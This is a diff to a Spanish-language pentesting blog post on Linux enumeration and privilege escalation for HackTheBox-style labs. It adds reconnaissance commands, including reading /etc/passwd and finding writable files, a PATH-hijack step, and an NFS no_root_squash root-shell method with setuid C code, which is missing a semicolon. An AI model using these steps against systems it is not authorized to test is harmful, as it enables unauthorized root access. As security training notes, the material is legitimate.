@@ -12,6 +12,139 @@ author: Sergio Salgado
 
 ## [](#header-2)<a id="introduccion">Introduccion</a>
 Un analisis de vulnerabilidades exitoso consiste en desarrollar una metodologia util para su ejecucion, en este post el objetivo es plasmar las herramientas vistas en el Libro Hacking Exposed Windows; a su vez actualizare la manera que se puede usar las herramientas desde kali Linux 2022 y tambien poner en que maquinas se ha utilizado en HtB para poder ejemplificar de manera correcta dichas acciones.
+Herramientas automatizadas para la enumeracion: 
+<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>
+<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>
+<a href="https://github.com/The-Z-Labs/linux-exploit-suggester">LES(Linux Exploit Suggester)</a>
+<a href="https://github.com/sleventyeleven/linuxprivchecker">Linux Priv Checker</a>
+
+## [](#header-2)Common Linux Enumeration
+Podemos usar el siguiente comando para obtener el nombre del sistema, normalmente esto nos puede indicar el rol que cumple el objetivo(Servidor de Base de datos, proxy, respaldo, etc.).
+```s
+hostname
+```
+
+El siguiente comando nos imprimira informacion del sistema, como informacion a cerca del kernel usado por el sistema. Esto es util al buscar vulnerabilidades a nivel de kernel.
+```s
+uname -a
+```
+
+El archivo de sistema /proc/version nos traera informacion sobre los procesos del sistema, en diferentes versiones de linux se encuentra y sera util incluirlo en el arsenal. Ademas de poder ver la informacion del kernel del sistema, podremos ver compiladores del sistema, como gcc.
+```s
+cat /proc/version
+```
+
+El archivo /etc/issue nos traera informacion relevante para entender el sistema, a pesar de que puede ser modificado facilmente es buena idea revisar este archivo siempre.
+```s
+cat /etc/issue
+```
+
+El comando ps, nos traera informacion sobre los procesos de la shell actual
+```s
+#Para ver todos los procesos
+ps -A
+
+#Para ver el arbol de procesos
+ps axjf
+
+#Para ver los procesos de todos los usuarios, este es con el que podemos extraer mas informacion
+ps aux
+```
+
+Para ver todas las variables de entorno, potemos usar el comando env. La variable PATH, podria tener un compilador que pueda ser usada para ejecutar codigo en el sistema y poder escalar privilegios.
+```s
+env
+```
+
+El sistema podria estar configurado para permitir que los usuarios puedan ejecutar comandos sin permisos de administrados y el comando siguiente listara los comandos que se podrian usar.
+```s
+sudo -l
+```
+
+Siempre que se use el comando ls, deberia usarse con las flags -la para que no se nos escape nada
+```s
+ls -la
+```
+
+El comando id nos podra listar mas informacion sobre el usuario actual, como sus privilegios, grupos de pertenencia.Tambien puede ser usado para tener la informacion de otro usuario.
+```s
+id
+id frank
+```
+
+En el archivo /etc/passwd podemos encontrar informacion sobre los usaurios, pero para cortar los resultados podemos usar los comandos siguientes.
+*Hay que recordar que con el 2do comando la lista que tendremos son usuarios de servicio o de sistema*
+```s
+cat /etc/passwd | grep sh$
+cat /etc/passwd | cut -d ":" -f 1
+```
+
+```s
+history
+```
+
+```s
+ifconfig
+```
+
+```s
+ip route
+```
+
+```s
+netstat
+#Nos mostrara todos los puertos de escucha y conecciones establecidas
+netstat -a
+#Para listar los protocolos UDP o TCP
+netstat -at || netstat -au
+#Para listar los puertos en modo listening y se puede combinar con la t o u para filtrar por protocolos
+netstat -l || netstat -lt || netstat -lu
+#Para listar estadisticas de protocolo, tambien puede combinarse con t y u
+netstat -s
+#Para listar conecciones junto con su proceso, y tambien se puede combinar con l para filtrar por puertos en escucha
+netstat -tp
+#Comunmente se usa el siguiente. -a Para traer todos los sockets, -n para la resolucion de nombres, -o para los tiempos
+netstat -ano
+```
+
+Ahora mi favorito, pero un poco invasivo/tardado a veces es
+```s
+#Para encontrar el archivo por nombre desde el directorio actual
+find . -name flag1.txt 2>/dev/null
+#Para encontrar el archivo por nombre desde el directorio /home
+find /home -name flag1.txt  2>/dev/null
+#Para encontrar el directorio con nombre config, desde /
+find / -type d -name config 2>/dev/null
+#Para encontrar archivos con todos los permisos para todos los usuarios o bien permisos 777
+find / -type f -perm 0777 2>/dev/null
+#Para encontrar archivos ejecutables
+find / -perm a=x -type f 2>/dev/null
+#Para encontrar todos los archivos para el usuario frank debajo de home
+find /home -user frank  2>/dev/null
+#Encuentra archivos que fueron modificados en los ultimos 10 dias
+find / -mtime 10  2>/dev/null
+#Encuentra archivos que fueron accedidos en los ultimos 10 dias
+find / -atime 10  2>/dev/null
+#Encuentra archivos que fueron cambiados en los ultimos 60 minutos
+find / -cmin 60  2>/dev/null
+#Encuentra archivos que fueron accedidos en los ultimos 60 minutos
+find / -amin 60  2>/dev/null
+#Encuentra archivos que tengan de tamano 50 MB
+find / -size 50M 2>/dev/null
+#Encontrar folders que se pueden escribir o ejecutar
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+#Encontrar herramientas de desarrollo y lenguajes disponibles
+find . -name perl* 2>/dev/null
+find . -name python* 2>/dev/null
+find . -name gcc* 2>/dev/null
+```
+
+Podemos obtener las capacidades con
+```s
+getcap -r / 2>/dev/null
+```
 
 ## [](#header-2)Common Linux Privesc
 En este apartado, nos centraremos en explotar lainformacion que se colecta a travez de la herramienta LinEnum.sh, que se puede encontrar en el siguiente <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">link</a>.
@@ -71,7 +204,10 @@ Esta tecnica consiste en explotar la variable de entorno del PATH, la cual se pu
 echo $PATH
 ```
 Para este ejemplo, realizaremos los pasos siguientes:
-1. Cambiarnos al directorio /tmp.
+1. Cambiarnos al directorio /tmp o a alguno con permisos de escritura.
+```s
+find / -writable 2>/dev/null
+```
 2. Crear un archivo llamado "ls"
 ```s
 touch ls
@@ -296,7 +432,47 @@ Ejecutamos ahora el archivo de suid y tendremos nuestra shell.
 ### [](#header-3)Passwords & Keys - Config Files 
 ### [](#header-3)Passwords & Keys - SSH Keys 
 ### [](#header-3)NFS
+La configuracion del Network File Sharing se encuentra en /etc/exports, se crea con la instalacion de NFS y normalmente puede ser leido por todos los usuarios
+El elemento de vector critico es la opcion "no_root_squash" Que por default, NFS cambia el usuario root a nfsnobody y deja el archivo operando con permisos de root. Si esta opcion esta presente en un archivo de escritura compartido, podemos crear un ejecutable con SUID y correrlo en el sistema.
+```s
+cat /etc/exports | grep no_root_squash
+```
+Para enumerar montables compartidos
+```s
+showmount -e 10.0.2.12
+```
+Vamos a montar uno de nuestros compartidos "no_root_squash" a nuestra maquina atacante y empezar a hacer nuestro ejecutable
+```s
+mkdir /tmp/backupsonattackermachine
+
+mount -o rw 10.0.2.12:/backups /tmp/backupsonattackermachine
+```
+Un simple ejecutable que nos permita usar /bin/bash
+
+```s
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0
+}
+```
+
+Ahora compilaremos el archivo
+```s
+gcc nfs.c -o nfs -w
+
+chmod +s nfs
+
+ls -l nfs
+```
 ### [](#header-3)Kernel Exploits
+La metodolgia es sencilla, solamente hay que:
+	1. Identificar la version de kernel
+	2. Buscar un exploit para la version de el kernel.
+	3. Ejecutar el exploit.
+`Podemos buscar estos exploits en Google, recursos como`<a href="https://www.linuxkernelcves.com/cves">la pagina</a>` y la ultima alternativa es LES aunque pueda generar falsos positivos`
+*Hay que recordar que un mal exploit de kernel puede ahcer que el sistema crashee y afecte a la prueba de penetracion*
 ### [](#header-3)Privilege Escalation Scripts 
 
 ## [](#header-2)FORENSCIS LINUX (LOGS IMPORTANTES)
